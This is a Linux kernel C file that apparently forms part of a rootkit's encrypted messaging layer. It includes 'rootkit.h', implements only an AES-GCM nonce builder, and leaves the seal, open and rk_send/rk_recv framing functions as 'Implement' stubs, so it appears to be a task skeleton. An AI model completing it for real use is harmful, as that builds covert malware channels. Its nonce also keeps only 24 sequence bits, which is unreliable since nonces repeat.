// SPDX-License-Identifier: GPL-2.0
// crypto/envelope.c - AEAD envelope: seal, open, nonce construction.
#include <crypto/aead.h>
#include <crypto/gcm.h>
#include <linux/scatterlist.h>
#include <linux/slab.h>

#include "rootkit.h"

static void build_nonce(u8 *nonce, u64 session_id, u8 direction, u64 seq)
{
	__be64 sid = cpu_to_be64(session_id);

	memcpy(nonce, &sid, 8);
	nonce[8] = direction;
	nonce[9] = (seq >> 16) & 0xFF;
	nonce[10] = (seq >> 8) & 0xFF;
	nonce[11] = seq & 0xFF;
}

// Implement aead_seal: encrypt plaintext with header as AAD.

// Implement aead_open: decrypt and verify ciphertext with header as AAD.

// Implement rk_send_sealed: build envelope header, seal, send as frame.

// Implement rk_recv_sealed: receive frame, verify header, unseal, check replay.
